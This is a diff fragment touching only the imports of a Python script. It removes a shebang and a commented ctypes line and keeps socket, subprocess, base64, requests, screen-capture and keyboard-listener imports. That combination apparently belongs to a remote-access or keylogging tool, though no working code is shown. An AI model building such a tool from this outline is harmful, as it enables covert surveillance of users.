@@ -1,4 +1,3 @@
-#!/usr/bin/python
 import socket
 import subprocess
 import json
@@ -8,7 +7,6 @@ import sys
 import shutil
 import base64
 import requests
-# import ctypes
 from mss import mss
 import threading
 import pynput.keyboard
